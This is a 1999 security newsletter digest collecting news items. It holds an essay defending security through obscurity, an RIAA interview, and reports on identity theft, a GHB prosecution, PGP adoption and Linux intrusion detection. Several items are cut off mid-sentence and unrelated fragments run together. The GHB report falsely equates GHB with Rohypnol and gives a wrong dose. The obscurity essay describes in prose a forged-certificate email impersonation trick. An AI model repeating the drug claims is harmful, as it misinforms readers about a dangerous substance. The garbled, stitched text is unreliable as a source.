     collaboration with colleagues in Israel and Norway.
     
     
     It may be of interest that, under the export controls on intangibles which
     England's DTI pushed in their recent White Paper and which they are now
     trying to have adopted as an EU regulation, I would have needed a personal
     export licence from the DTI in order to do this work.
     
     
     It seems somewhat unlikely that a licence would have been granted.  Arms
     exporters complain to me that DTI officials are notorious for blocking
     licences to punish them for such 'offences' as complaining about the
     licensing process.  So perhaps I would have not done the work; perhaps I'd
     have defied the law and now be involved in a huge test case in the European
     Court; perhaps I'd have emigrated; perhaps we'd just not do research in
     collaboration with foreigners.  Who knows?

     Obscurity as Security
     
     Posted by CmdrTaco on Tuesday August 17, @10:00AM EDT
     from the saaay-wait-a-minute dept.
     Matthew Priestley has taken a break from slaving for the man to write us a piece where he takes on the
     convential wisdom that Security through Obscurity isn't secure at all, and tries to argue that sometimes it
     is.  The following was written by Slashdot Reader Matthew Priestley 

     Disclaimer: The author of this paper works for Microsoft, but his opinions may not be those of Microsoft. In
     fact, they aren't. The author hereby declares that nobody important is even aware of his existence and that
     the closest he has ever come to plotting with Bill Gates on the Master Plan was when they used adjacent
     urinals this one time. The author did not peek. 

     0 Introduction

     With the popularity of the open-source mindset, a general contempt has drizzled upon all forms of obscurity. The
     concept of security through obscurity (STO) in particu lar has been decimated. Security through obscurity, which
     relies on the ignorance of attackers rather than the strength of defenders, is dead in all but practic e. The victory of the
     opposing full disclosure approach is so complete that proposed ta ctics die at the mere hint they are a form of STO. 

     This paper suggests security through obscurity can and does work in certain strictly limited ways, and should not be
     eliminated unthinkingly from the admin's arsenal. It further implies that the boundaries between STO and 'real' security
     are blurry and deserve evaluation. However, this paper in no way proposes obscurity as a method for keeping
     secrets in the long term. 

     1 Full disclosure does not apply to instantiated data

     Instantiated data - the data used by specific instances of an algorithm - do not fall within the scope of full disclosure.
     Were this not so, then even the simplest password would violate the ban on security through obscurity. Passwords
     are secrets known only to their creators, and password entry is commonly obscured, as in the case of the 'shadow'
     login of UNIX. While the login protocol may be open, passwords themselves are a form of STO, with obscurity
     localized in the password string. 

     Instantiated data are exempt from full disclosure because the risk from their failure is limited. When a script cracks a
     password, the damage done to the secure system extends only as far as that password's scope. The cracker cannot
     use the compromised string to gain power directly in another system, even if that system runs the same password
     protocol. Nor can anything be inferred about the value of one password merely from the value of another with equal
     or lower permissions. 

     A similar example of instantiated data obscurity is the private key that forms the basis of asymmetric cryptography.
     So obscure is this information that it is rare for even the owner to be familiar with its precise value. But such obscurity
     is a necessary element of modern security schemes. Strong security does not eliminate obscurity - rather, it localizes
     obscurity to instantiated data. The phrase in cryptology, 'carry all security in the key' might be better phrased 'carry all
     obscurity in the key'. 

     2 Full disclosure does not apply to time-limited secrets

     Secrets that expire after a short lifetime can be protected by a wider array of techniques than long-standing secrets.
     The defense of information that will be irrelevant in a matter of hours or days may not warrant fully peer-reviewed
     security. Consider the famous Navajo code-talkers of World War II. Among the Americans coordinating the at tack
     against Japanese-held islands in the Pacific were a number of Navajo Indians, who spoke a slangy version of the
     complex Navajo tongue. Commands from HQ were issued through these code-talkers, who encrypted and
     decrypted with an alacrity that belittled the automated methods of the day. This is an excellent example of time-limited
     security through obscurity. Secret languages are excellent security in the short-term, but however cryptic Navajo may
     be, it is a code subject to human betrayal. Use of Navajo against the Japanese much beyond the 3-year window of
     the war would have been unwise. But because the secrets of American strategy in the Pacific were irrelevant after the
     conclusion of the fighting, the long-term weakness of obscure Navajo as a security measure was unimportant. 

     3 Obscurity serves as a tripwire

     Perhaps the classic example of wrongheaded STO is the administrator who modifies his web server to listen on a
     nonstandard port - thereby confusing attackers, as the theory goes. Considering the degree to which tasks such as
     port scanning can be automated, the naivete of this defense seems plain. The cracker might be forced to check all
     64512 unreserved ports, but eventually the concealed web server will be found. This appears to be a weakness of
     STO, but if manipulated correctly, it is in fact a great strength. Imagine that our same admin had also invoked a
     tripwire script and set it to listen on one or more unused ports. When the tripwire is probed with a SYN packet from
     a cracker trying to locate the web server, instantly the system goes to full alert. The packet is logged and the admin's
     pager sounds like an alarm. 

     Such tripwire approaches work because they do not expect obscurity to keep information hidden. Rather, they
     obscure information as a ploy to force invaders into showing their hand. Because the obscured implementation differs
     on each system, crackers must resort to guess-check scanning before attacks can commence. But tripwires are
     deployed throughout the system, anticipating this very move. Running an automated kit suddenly becomes a risky
     proposition, and even talented crackers must gamble on, for example, whether 'root' is really the name of the primary
     account or merely a hotline to the authorities. 

     Lighthearted implementations of this approach are a staple in the popular "Indiana Jones" films. In one scene, Jones is
     confronted with a hallway of lettered tiles, all seemingly alike. To cross safely he must step only on those tiles with
     letters corresponding to the secret word 'Jehovah'. The penalty for a misstep is to crash through the floor and
     plummet into a gaping pit. Attackers not privy to the password would find an exhaustive search less than optimal in
     this case. When traps are mingled with genuine data, STO can be a powerful disincentive. Such measures do not
     make a given machine resistant to breach in the long term, any more than medieval moats could ultimately protect
     their castles. But like moats, tripwire obscurity provides a critical buffer against attackers, allowing defenders room to
     breathe. 

     4 Asymmetric cryptography exhibits traits of STO

     Despite the notion that asymmetric cryptography such as RSA is 'real' security, in some aspects these methods
     resemble STO. Indeed, this entire class of cryptography is founded on the hopeful guess that a certain mathematical
     problem is intractable. The back door into cryptographic methods that rely on multiplying primes is, quite simply, to
     develop a swift means of factoring those multiples. This NP-time problem must be solved before a private key can b
     e derived from its corresponding public key, and the notorious difficulty of NP problems leads some supporters to
     characterize asymmetric cryptography as 'prova bly secure'. This is far from the case - there is uncertainty among
     mathematicia ns as to whether this problem will even prove non-trivial once approached from t he right angle.
     Startling progress has been made in solving similar 'impossible' problems using innovative ploys - for example, DNA
     computers can now solve the Traveling Salesman problem in linear time. Given that asymmetric encryption is used
     widely in the world's e-commerce infrastructure, the repercussions when this piece of obscurity is cracked are
     disturbing to contemplate. 

     One telling argument against STO is that it promotes a false sense of security, leading admins into complacency. But
     the complexity of asymmetric cryptography, combined with reports of its infallibility, can produce much the same
     effect. Co nsider this social-engineering exploit of digital signing. Using a tool such as m akecert, the cracker
     generates a root certificate with the name 'Verisign Class 1 Primary CA' and uses it to sign an end-entity certificate
     with the subject 'CN=Rob Malda, E=malda@slashdot.org' (CT:Please don't. I'm used to posers pretending to be me
     in Quake, but not on email ;) The cracker then sends the email to an enemy, using a client that does not validate
     e-mail addresses and spoofing the return address friendly name. The inexpert recipient, thinking all is in order and
     knowing that digital signatures never lie, trusts the root certificate and hence forth carries on a conversation with a
     false CmdrTaco. Only scrutiny of the headers will reveal the mail is actually going to a different address. The widely
     made claim that public-key cryptography is 'real' security and completely unrelated to 'false' STO delivers a more
     powerful illusion of security than anything an XOR'd password file can provide. 

     Even brute-force cryptanalysis has parallels in STO. Suppose we wish to conceal the passwords for a number of
     Swedish bank accounts. We resolve to write them to a secret location on our hard drive, perhaps a few unused bytes
     in a file sector. Only we, who know the lucky offset, can read the data. This form of concealment is a typical case of
     secruity through obscurity. The integrity of our secret depends on the ignorance of the cracker, and a trial of all 2^n
     possible locatio ns compromises the system. But in what way is this fundamentally different from the 'genuine' security
     of n-bit encryption? To break this form of security, 2^n keys are generated and tried agains t the cipher text until the
     result is a plain body. Is the difference between this 'true' security and the 'false' STO merely than n is considerably
     larger in encryption than in the case of hard drives? But this implies that our real error lay, not in reliance upon
     obscurity, but in having a hard drive of insufficient size! 

     5 Conclusions

     Security in the absence of obscurity is not strictly possible, but good systems both localize and advertise their points
     of obscurity. When the admin is fully a ware of the obscurity in a system, tripwires and instantiated data can provide a
     useful complement to more rigorous security techniques. Obscurity cannot keep information safe or concealed for
     long, but it can make attacks risky and destroy the effectiveness of automatic kits. These benefits should not be
     dismissed as an article of faith.

12.0 THE MUSIC INDUSTRIES' "CYBER-SHERRIF"
     ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
     
     From http://www.net-security.org/

     by Thejian, Tuesday 17th August 1999 on 9:00 pm CET
     The growing number illegal MP3 copies of copyrighted songs that are distributed
     across the Net is becoming an increasingly big problem for the music industry. Here's
     an interview with RIAA Executive Director Hilary Rosen on this matter. Read the
     interview below
     
     http://www.businessweek.com/bwdaily/dnflash/aug1999/nf90817b.htm      
     
     Music and the Net: A Chat with the Industry's Cyber Sheriff 
     RIAA Executive Director Hilary Rosen sings a tune you might not expect 
     
     "When the music's over, turn out the lights" crooned the Doors' Jim Morrison some 30 years ago. Today, the
     dirge is a fitting take on how Net pioneers regard the lumbering record industry, which they almost giddily
     hope will be toppled by the Web's ability to sort and transmit digital music for sale online. In recent months, the
     industry's vulnerability has been underscored by the stunning growth of MP3 files -- many of which are record
     companies' own copyrighted songs uploaded sub rosa onto illegal trading posts. 
     
     The record companies have a sheriff, of course. She's Hilary Rosen, long-time executive director of the
     47-year-old Recording Industry Association of America. While the industry undergoes painful, and sometimes
     enlightening change, it's Rosen's responsibility to keep order. The hastily formed Secure Digital Music
     Initiative, for instance, is an effort by the major record and technology companies to stop illegal duplication of
     copyrighted material. Beyond this squabbling over standards, Rosen must also help record companies confront
     a larger question: Will they even matter 20 years from now? Looking for answers, Business Week staff editor
     Dennis Berman chatted with Rosen recently. Here's an edited transcript of their conversation: 
     
     Q: How would you describe the state of mind of a big chunk of your consumers, namely young
     people who are growing up on the Internet, where so many of the products and services are free?
                              A: I don't think the concept of music being free is new. I think the shift is how
                              consumer expectations of getting products through the Internet has built up as
                              a free activity. But I actually don't think it's as big a problem as some people
                              might expect me to think. We know consumers want music. And we know
                              they want it online, and I'm grateful to the MP3 phenomenon for showing the
                              music community just how badly [consumers] do want it. 
     
                              They're willing to spend all that time and energy to download in the most
     difficult, complex, time-consuming, incompatible ways. I mean, have you downloaded MP3 files? It's a pain.
     It's not really easy. It's hard to choose the thing, you don't really get the sample. It's not easy. 
     
     So if they're willing to go through that much trouble to get music, I'm completely convinced that if an artist
     offers them a fresh version of the highest sound quality with the lyrics packaged, then consumers want to pay
     for that. It will be easy, it will be compatible. 
     
     Q: What business lessons do you think record companies -- habitually criticized as being slow and
     lumbering and profiteering -- have learned from the Internet?
     A: I think No. 1 would be that record companies were traditionally forced into the box of seeing the retailer as
     their customer, because the retailers bought the records and then sold them to the consumer. Whereas, the
     Internet has given both the record companies and the artists a direct relationship with their fans. That's
     probably the most significant thing. 
     
     We have a small member company label called Astralwerks. It's a great label, great energy. Their relationship
     with the Chemical Brothers [a techno group] is so intense that they now have their marketing plan for the new
     Chemical Brothers release suggested to them by the fans whom they have Web relationships with. 
     
     Gimmick, yes, but extraordinarily appealing. [Now] people communicate
     with you about real research, not just a bunch of guys in gray suits telling you
     what they perceive their phone bankers have learned -- but real research.
     So, I think that's No. 1 -- that it is fundamentally changing the relationships
     that exist between the music consumer and the providers of the music. 
     
     I think one other thing, and that is the sort of value equation about music use. It used to be that there was one
     business model, they sold records. So, all of their investment and marketing or promotion and tour support,
     and whatever they did with an artist, had to be made up in a record sale. With the Web, you have the
     opportunity for a real variety of business models, driven by the consumer. That means you don't have to make
     a million dollars selling the whole album. 
     
     If you make $100,000 here selling the album, and $100,000 dollars in licensing fees for a track on an online
     jukebox, and then another $100,000 doing your licensing for a Webcast, then the multiple revenue streams
     really allow you to take a lot more risks -- on music that might not otherwise be as profitable, and that you
     wouldn't, therefore, take the risk on. 
     
     Q: What do you worry most about?
     A: I think it's interesting how labels can sustain major artists' increasing desires -- and deserved desires -- for
     more and more money, with limited capitalization in some of the more entrenched companies. And I guess it's
     sort of how do you get the infusion of cash that you need, and then, what do you do with that cash? 
     
     Q: How do you feel about losing the suit against Diamond Multimedia [the first company to develop
     a mobile player for MP3 files. The RIAA sued Diamond, claiming that its technology allowed for
     illegal use of copyrighted material.]
     A: Somebody asked me if we'd bring the Diamond suit again. As recently as 18 months ago when this suit was
     brought, the whole world was different. 
     
     Q: How was it different?
     A: The technology industry didn't come to the table with any level of understanding for the creative community
     -- that the products were being considered as ways to exploit the music, not expand it. At the time, it was the
     best judgment call that was made, that we could make. 
     
     Q: So, you regret it now?
     A: No. What I regret is that it sends a signal about our attitude, which I think is incorrect. It was never the
     strategy, it was just a part of the strategy. Concepts like SDMI and bringing people together has always been
     the strategy. And the RIAA, unfortunately, jumped out of the box there. 
     
     Q: One thing that seems to be missing is artists' involvement. Artists saying, "Hey, you know, we
     put out this music that means so much in your life, we deserve to be paid for it. We certainly don't
     deserve to be ripped off." Why don't we see more artists making those statements?
     A: I think artists don't like to be perceived as getting into controversy -- they're about their music, they're
     about their relationships with their fans. I think that given the way that this was positioned in the press over the
     last two years -- artists vs. fans, artists vs. record companies -- anytime somebody said something, they were
     taking sides. I think that has been tough. 
     
                              But I will tell you, I get calls from artists and managers every day asking us to
                              take stuff off a Web site. If artists were every day telling me, "You know, we
                              don't believe in what you're doing, we think this should all be free. We don't
                              care about our stuff being protected," I'd go find another job. They don't, as
                              a rule, feel that way. As a rule, they pretty much feel like they should get
                              compensated. 
     
     Artists, a lot of artists, deserve to be, need to be, want to be seen as technology-friendly. And I think if we can
     provide a safe space for them to be able to do that and still protect their interests, that's O.K.. 
     
     Q: If you had to draw a pie chart of how you spend your time, I guess the Internet is taking a bigger
     piece of the pie. How has that changed over the last two years?
     A: I would say that four years ago, it was 10%, and now it's 90%. It's a lot. Although I've had a heavy six
     months on violence in music, too. Music has always represented some social rebellion, and the Internet has
     become a socially rebellious child, in essence, for a lot of mainstream business and parents. For everybody
     else who is used to a certain way of life, the Internet is just banging on their door, just like that nasty rock and
     roll that you wish would leave your daughter alone. 
     
     Q: So over time, the Internet may put more power into independent labels? In the next couple of
     years, the independents may take more of the pie?
     A: I actually don't think that the pie stays the same size. I think the pie expands. 
     
     Q: How long does it take record companies to realize that?
     A: Maybe it took a minute longer than it took every other smart person in the world, but they're there. 
     
     The majors take a lot of knocks for being slow to come to this thing. And, you know, some of it deservedly

     Network Associates will unveil technology this week that it said will revolutionize the process of
     keeping computers updated with the latest anti-virus software. 
     
     The security firm's McAfee division will launch its ActiveShield service through its McAfee.com
     Web site, which will deliver anti-virus software updates to users' computers whenever they are
     connected to the Internet. 
     
     Anthony Kim, manager of McAfee Clinic, said the software has the potential to limit the damage
     caused by such outbreaks as the Melissa virus, because users will receive fixes as soon as they are
     available. 
     
     The ActiveShield software pings the McAfee server daily to check for software updates, patches
     or fixes. It gives the user the option of downloading and installing the fix, or doing it at a later date. 
     
     McAfee will price ActiveShield at $39.95 for a yearly subscription. But, for a limited time, it will
     be $19.95.

     Two Charged With Promoting Date-Rape Drug Via The Net

     By Bob Woods, Newsbytes
     LANSING, MICHIGAN, U.S.A., 
     16 Aug 1999, 3:21 PM CST

     Two men who live outside Michigan have been charged by that state's attorney general in connection with
     allegedly promoting the sale and at-home manufacture of the controversial drug gamma- hydroxybutyrate
     (GHB), better known as the "date-rape drug." 

     Attorney General Jennifer M. Granholm, D, also said the two men have been filed with notice to stop within 10 days the sale
     of the so-called "kits" to make the drug, or face additional criminal charges and penalties of up to 90 days in jail, a $5,000
     fine, or both. 

     The action marks the first time a criminal prosecution has been initiated as a result of selling GHB over the Internet, attorney
     general spokesperson Chris DeWitt told Newsbytes today. 

     Both Carl Gorton, 63, of Merritt Island, Fla., and John Hedrick, 22, of Colorado Springs, Co., are now were charged with one
     count of solicitation to manufacture a controlled substance. Charges were filed in 36th Judicial District Court in Detroit. 

     Gorton and Hedrick now face felony charges and a maximum penalty of 30 years in jail, if convicted. Gorton was at large as
     of this afternoon, while Hedrick had been arrested and is now out on bond, DeWitt said. 

     GHB, which is marketed as Rohypnol, is also known as roofies, liquid ecstasy, liquid X and organic Quaalude, among other
     names. A 2-milligram (mg) dose of GHB can result in unconsciousness within 20 minutes of ingestion, usually through a
     drink laced with the drug. The next morning, the person who took the drug has no memory of the previous evening's events. 

     Gorton and Hedrick "knowingly and intentionally" solicited undercover agents from the attorney general office's new High
     Tech Crime Unit to make GMB through the sale of a "do-it-yourself" GHB ingredient kit, authorities say. 

     A Website owned by Gorton allegedly advocated and encouraged the use of GHB, and stated that the company can offer
     "legally available GHB" because it has "concluded that the chemical components could be sold as a kit and combined by
     customers at home without special equipment, all of which is safe and perfectly legal," Granholm's office also said. 

     "Selling a dangerous, controlled substance on the Internet doesn't make it safe, and it certainly doesn't make it legal,"
     Granholm said in a statement. 

     The alleged action occurred via the Website sponsored by "Centurian Aging Research Laboratory" (CARL). The CARL
     Website included an order form that directed customers to send cash or money orders to a post office box registered to
     Hedrick, the attorney general's office also said. 

     The Website is no longer active, DeWitt said. 

     GHB, under Michigan law, is a Schedule 1 controlled substance, which makes it illegal to use, manufacture or possess the
     drug in the Wolverine State. Soliciting or inducing the manufacture of such controlled substances is also illegal. 

     DeWitt said the attorney general was within the scope of her office to go after the two suspects. "It would be no different if
     someone called a person in Indiana to buy heroin, and it was then shipped (to Michigan)," he said. 

     Granholm's High Tech Crime Unit is made up of three assistant attorneys general, one investigator, and support staff,
     DeWitt said. The team, which is a part of the attorney general office's criminal division, deals with illegal activities conducted
     via the Internet on both a criminal and civil basis. 

     "With the Internet becoming more and more available, there are those who will take advantage of other people," he added.

      NFO Interactive conducted a survey on how netizens feel about e-commerce and
      privacy. The survey polled more than 4.500 Internet users of which 1.944 had never
      made an online purchase. Nearly 70 percent of that number would make online
      purchases if they had assurances that their privacy would be guaranteed. More on

      Online Consumers Demand E-Commerce Privacy - Study 

      http://www.newsbytes.com/pubNews/99/134914.html

      The majority of Internet users who are not currently participating in e-commerce would be more likely make
      purchases online if they felt comfortable that their privacy would be guaranteed, a soon-to-be- released study
      found. 
 
      Nearly 70 percent of those netizens who have yet to make an Internet purchase would be enticed to do so if they had
      assurances that their privacy would be protected, the survey found. Conducted by NFO Interactive, the survey polled more
      than 4,500 Internet users. Nearly half of those polled (1,944) had never made an online purchase. 
 
      "It's going to be the (online) merchant's responsibility to educate the users" about privacy protections, NFO Director of
      Research Tim Washer told Newsbytes today. 
 
      Other factors that reticent Internet users said would encourage them to make purchases online included deeper price
      discounts (65 percent) and the ability to return defective or unwanted products to a physical location (28 percent). 
 
      Washer also stressed the potential value of independent online privacy "seal-of-approval" programs, such as those offered by
      Truste and BBBOnLine. By funding, promoting and participating in those programs, e-merchants could help ameliorate some
      consumer concerns about privacy, he contended. 
 
      Among the attributes survey participants said would attract them to a retail Website were: strong privacy protection
      standards; access to secure purchasing servers; overall technical reliability; up-to-date content; and timely delivery. 
 
      The NFO study comes on the heels of another survey, released last week, that indicated nearly a third of all Internet users
      make purchases online. 
 
      That survey, conducted by CDB Research & Consulting, found that apprehension about online shopping is dissipating as
      e-commerce sites improve security procedures and make information about security more readily available.

17.0 IDENTITY-THEFT
     ~~~~~~~~~~~~~~
     
     From http://www.net-security.org/
     
     by Thejian, Tuesday 17th August 1999 on 2:30 am CET
     Anyone seen the Net? Infoworld has a story on identity-theft, people who instead of
     stealing from you, "become you". Your name, social security number, driver's license
     number, credit record.. all can easily be hijacked. "It would never happen to me" is a
     common response, but according to this article more than 500.000 people fall victim
     to this "social engineering attack" in the US every year. Infoworld       
     
     August 16, 1999 

       Future criminals will not need to steal from
       you -- they will simply `become you'

       What would you say if we told you that we could "become you" if we
       wanted? Establish (or ruin) your credit, cash checks, obtain a driver's license
       or passport, even commit crimes -- all in your name. The sad fact is that your
       name, social security number, driver's license number, credit record --
       essentially what defines you in modern society -- can be easily hijacked. 

       "It would never happen to me" is a common response to what seems
       inconceivable. The fact is, every year in the United States more than
       500,000 people fall victim to this social engineering attack. And it can be one
       of the most invasive, exhaustive experiences you'll ever endure.

       Why do so many people each year fall prey to the identity-theft vultures of
       the world? Simply put, we're too trusting. We preprint our home addresses
       (and even our driver's license numbers) on our checks. We give out our
       home phone number to anyone who asks. We throw sensitive bills, as well
       as bank and credit statements, in the trash. The bottom line is that we, as a
       society, make it too easy to become victims.

       By far, the biggest opportunity for an identity thief is not by digging through
       your trash or overhearing your phone number. Instead, the best time for a
       thief to garner precious information is during a move. The situation provides
       such a ripe opportunity for an attacker to pick up box after box of
       identity-defining information such as birth certificates, social security
       numbers, paycheck stubs, credit card numbers, and other personal effects.
       Together, these belongings represent ample means for an attacker to obtain a
       driver's license, password, and credit card.

       We've accumulated a small collection of helpful hints to prevent identity theft.
       Start by purchasing a cross-cut shredder for your home and business: Every
       document you throw away should be carefully reviewed for sensitive
       information. Never freely give out information such as address, phone
       number, or driver's license number -- and never give out your social security
       number (unless required to). Once your awareness is heightened, you'll be
       surprised at how many people ask you for these personal items.

       Obtain a post office box, and use it whenever someone requires an address.
       Using your credit card over the Internet is fine, just be sure the Web site
       employs SSL for card number encryption. 

       To get a handle on identity theft, you should also read Identity Theft: the
       Cybercrime of the Millennium, by John Q. Newman, and 21st Century
       Revenge: Down and Dirty Tactics for the Millennium, by Victor Santori.
       Both books are from Loopanics Unlimited and give you a solid foundation
       on the techniques used by thieves.

       All this is little help to those who have already fallen victim to an attack.
       Here's what you can do after turning into a statistic. 

         -  Inform the three main credit-reporting bureaus -- Equifax, Experian,
            and Trans Union -- by phone and letter. Ask that no new credit be
            approved without your notification beforehand. 

         -  Inform all of your current credit card and loan companies about the
            theft.

         -  Inform all of the check-monitoring agencies, such as CheckRite,
            Chexsystems, etc. 

         -  Make sure your police department files a report on the crime, or your
            future identity-theft claims may fall on deaf ears.

         -  Obtain a new driver's license, and inform the department of motor
            vehicles that you suspect identity fraud.

         -  As a last resort, especially if the thief has used your social security
            number to obtain credit in your name, request a new social security
            number. However, be careful with this step because it can make it
            difficult for you to get credit in the future.

       The physical security of one's identity is as critical as any virtual electronic
       bits and bytes floating through a silicon wafer or a copper wire. As more of
       the components of physical identity become translated into digital form, the
       two will become intrinsically intertwined.

     pedophiles and similar perverts. Insp Terry Jones, the head of the squad, said that the
     unit monitored few chat rooms for 60 hours - and as a result they arrested 19
     suspects. In addition to pedophiles, the unit will investigate some other criminal
     activities conducted via computers (for instance illegal gambling, blackmail, industrial

     XIV. Guest column
     -----------------
              
     This weeks guest column is by Natasha Grigori of the ACPO, a cause which Help Net
     Security supports fully.
              
     The mission of ACPO, and our goals:
              
      ACPO is a non-profit Group formed to actively seek out and stop the
     exploitation of children on the Internet. Our focus is to protect our
     children from the predatory and perverse criminal elements that seek to
     destroy their innocence. While we are firmly in favor of free speech in
     all its forms, especially on the Internet, we are opposed to the active
     sexual exploitation of children. We have chosen to act against the
     dissemination of child pornography over the Internet. Our motivation is
     the fact that there is a genuine connection between the distribution and
     acceptance of pedophile pornography and actual incidents of sexually
     abused children. Not to mention that all-existing hardcore pedophile
     pornographic material is the result of very real abuse. Our children are
     our future, as such we must protect them as we would our own lives and
     in doing so ensure a better future for us all.
              
     Our secondary focus is to educate. We want to provide individuals and
     organizations training about the Internet and its associated risks. We
     will counsel law enforcement on the Internet aspects of gathering
     information and evidence. We pursue all of our goals with the ethical
     and moral values of most anybody confronted with this abhorrent
     practice. We will tolerate only approaches, and condone no illegal
     activities. Failure to abide by the ACPO operations standards is ground
     enough for revocation of ACPO membership.
              
     Our goals can be broken down as follows:
              
     1. Provide a maximum of information to concerned law enforcement
     authorities, including activity hotspots on the Internet and the results
     of our own investigations into the activities of online child
     pornographers.
     2. Put a halt to sensationalism and hype regarding the Internet while
     promoting quality investigative journalism on pedophile pornography.
     3. Create enough public pressure to bring authorities to the point of
     action.
     4. Form a cooperative with other Internet groups with similar goals,
     which will benefit us all and increase our impact. We are working to
     provide a website to which our members will be able to turn for
     information and resources, and will add other means of communication.
     Our approach is somewhat different from other organizations, in that we
     are combining the drive for wide public support with the knowledge of
     Internet experts.
              
     This is our first public description of our mission. We view this as a
     work in progress that will continue to be refined.
              
     If you have any questions or concerns about our Mission Statement,
     please feel free to mail me at Natasha@infovlad.net You should get a
     response from me with in a week, possibly less. And BTW look for our
     exciting news next Friday.

21.0 GISB WILL USE PGP
     ~~~~~~~~~~~~~~~~~
     
     From http://www.net-security.org/
     
     by BHZ, Tuesday 17th August 1999 on 1:29 am CET
     Gas Industry Standards Board (GISB) decided that for securing transactions over the
     Internet, they will use PGP (Pretty Good Privacy) technology rather than the more
     popular standard developed by RSA - S/MIME (Secure/Multipurpose Internet Mail
     Extension). More on the story on Internet Week. 
     
     http://www.techweb.com/se/directlink.cgi?INW19990816S0032
     
     August 16, 1999, Issue: 777
     Section: Systems & Management

     Utilities Choose PGP Encryption Over S/MIME
     Rutrell Yasin

     Suppliers of natural gas now have a standard way of securing electronic
     transactions between trading partners.

     While the Gas Industry Standards Board joins a growing list of vertical
     industry consortia forming such standards, it is among the first major groups to
     chose PGP (Pretty Good Privacy) encryption and authentication technology
     rather than the more popular S/MIME (Secure/Multipurpose Internet Mail
     Extension) standard developed by RSA.

     The GISB's decision to adopt PGP for its 165 corporate members-which
     include Amoco, Exxon, Mobil, Con Edison and Pennsylvania Power & Light
     Co.-is a major endorsement for PGP. This choice came from the fact that
     PGP is file-based, providing data encryption for both e-mail and file-based
     data.

     Also, the group felt it was better suited for its requirements, which include data
     privacy, integrity, authentication and nonrepudiation.

     While the S/MIME standard also supports those core functions, it is intended
     only for e-mail encryption. The GISB has been experimenting with PGP since
     1996, before S/MIME became a standard, according to Carl Caldwell,
     chairman of the GISB's electronic delivery mechanism committee.

     GISB was looking at ways to send encrypted EDI files, using HTTP as a
     transport, "but at the time, SSL [Secure Sockets Layer] was owned by
     Netscape, and we didn't want to pick one specific Web server and browser,"
     Caldwell said. Plus, "we needed a file-based security product."

     Though S/MIME is the de facto standard for e-mail encryption and an
     Internet Engineering Task Force draft specification, as well, the IETF is
     working on AS2, a convergent standard that will let companies securely
     exchange EDI files, using HTTP as a transport. EDI data will be packaged in
     MIME messages that use public key security, Caldwell said.

     PGP will help the GISB member companies secure more than 37 different
     types of business transactions, from ordering space on a pipeline to moving
     gas to paying for it once it reaches its destination, GISB officials said.

     Based on GISB's choice of PGP, the Federal Energy Regulatory Commission
     (FERC) has mandated that all members of the gas industry implement PGP
     2.6 or greater to secure electronic transactions, said Carl Caldwell, chairman
     of GISB's electronic delivery mechanism subcommittee.

     GISB and FERC's adoption of a standard for the gas industry is a move in the
     right direction, said Phil Schacter, an analyst at the Burton Group. "I like the
     model of a community defining [standards]."

     Still, Schacter wondered whether there would be interoperability issues
     between companies using PGP 2.6 and those using newer versions with RSA
     and X.509 certificates. However, Network Associates, which acquired PGP
     Inc. last year and is the major supplier of PGP-based software, said it has
     backward-compatible versions.

     From its origins as shareware software, PGP has emerged as a de facto
     standard for data encryption among consumer users and individuals, but not
     many large companies are using it on an enterprise and extranet basis.
     Nevertheless, under the auspices of Network Associates, PGP is evolving into
     a more flexible, robust product for the corporate world, industry analysts said.

     Network Associates has "broadened the scope of the application, [adding]
     support for RSA [encryption] and X.509 digital certificates," Schacter said.
     PGP supports other standards, such as Secure Sockets Layer (the
     predecessor to the IETF-backed Transport Layer Security protocol) as well
     as OpenPGP and the Lightweight Directory Assistance protocol. Network
     Associates offers an integrated suite, called PGP Enterprise Security.

     PGP's broadened scope is one reason GISB is adopting the technology as a
     standard, said Rae McQuade, executive director of the standards
     organization.

     "We were attempting to develop a standard [that would operate] over a wide
     variety of hardware, operating systems and programming languages," she said.

     A 23-year-old hacker, was sentenced for two charges of unlawful modification of
     computer material and two of unauthorised access to a computer to 3 years in jail
     and his computer was confiscated. Scott Reid, 23, hacked into the Vodaphone short
     messaging network, sending a message in text form to 32,000 international
     subscribers telling them they had won a Peugeot 106 car and must ring a certain
     number to claim it. The number he quoted was that of GS (UK), a Nottingham firm
     supplying software for the embroidery industry, where he had previously worked. The
     result, Nottingham Crown Court was told, was that the firm's business was brought to
     a standstill which caused an estimated 10.000 pound loss in business. Besides that
     he also infected the computer systems of this company with a trojan horse named
     "Colourmatch". It appears the attacks were carried out because of a grudge Reid had
     against his former employer because of a terminated project of his. This was reported

25.0 DETECTING INTRUDERS IN LINUX
     ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~

     Here's an article on system intruders in Linux. Besides dealing with how to monitor
     your system and in this way detect the intruders, it also speaks about how to be
     prepared for the event your systems get compromised. Because face it, intrusions
     CAN happen to anyone. Read it

     Detecting Intruders in Linux


     Read this week's other cover story about auditing Cisco routers
     August 16, 1999 - An intrusion into your network and host systems by persons
     unknown is one of the biggest nightmares for systems administrators. Many of us
     don't even want to think about the possibility of this happening, or feel that our
     perimeter security makes a serious intrusion a remote possibility. However,
     intrusions can happen to anyone, on any public or private network. In order to
     best detect and respond to an intrusion, you must first plan for an intrusion, then
     have all the appropriate monitoring capabilities deployed.
 
     Plan for an intrusion
 
     Develop a baseline of normal operating conditions. To do this, you should audit the file system, network services,
     logon activity, normal CPU load, disk utilization, etc. It is important to get a sense of what log files normally look like. A
     very skilled attacker may leave little evidence of their presence, and only a full system audit can help you detect
     subtle system variations later. The tools to perform audits range from the simple and familiar utilities, such as netstat,
     to get network statistics and ps/top, to get CPU stats to more complex tools, such as Tripwire and Logcheck.
     Tripwire takes a snapshot of your complete file system and generates an MD5 hash of the files, which can be
     compared with a later snapshot to find any file system variation. Logcheck, part of the Abacus tool set, is a program
     that automatically will run and check system log files for security violations and unusual activity. Running these tools
     on a system that is in a pristine state before it is put into production can yield valuable information down the road.
     Backups - the obligatory statement that solid backups are the only way to be certain that you can recover from an
     intrusion is inserted here. Your Red Hat Package Manager (RPM) database can be a key indicator of system tampering,
     so it should be backed up after package adds, deletes and changes. Also make sure you have a clean copy of the
     bin/rpm binary. RPM's abilities for version control and discovering file dependencies really allow it to shine in warning of
     file integrity problems.
     Build an offline kit of standard system utilities. Depending upon how quick you are in detecting an intruder, you
     may or may not be able to trust normal utilities, like ls, ps, top, mount, cp, mv or grep, to help you detect tampering.
     A skilled attacker may substitute their own version of ls and top for example, which conveniently filter out rogue
     daemons they have installed. You should have clean copies of these utilities ready to use.
     Develop a response plan. A response plan can be as simple or complex as necessary, based upon the value of the
